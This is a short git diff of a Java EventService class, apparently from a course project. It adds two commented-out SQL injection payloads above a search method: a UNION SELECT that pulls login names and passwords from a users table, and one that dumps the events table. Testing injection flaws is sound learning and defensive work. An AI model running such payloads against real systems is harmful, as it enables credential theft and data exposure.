@@ -90,7 +90,8 @@ public class EventService {
         eventEntity.setDescription(eventModel.getDescription());
         return eventEntity;
     }
-
+    //' UNION SELECT 999, 999, '2024-01-01', login_name, password, 999 FROM users WHERE 'a'LIKE'a
+    //' UNION SELECT * FROM cst407.events 'a' like 'a
     public List<EventModel> findByDescription(String searchString) {
         List<EventEntity> eventEntities = eventRepository.findByDescription(searchString);
         return convertToModels(eventEntities);  
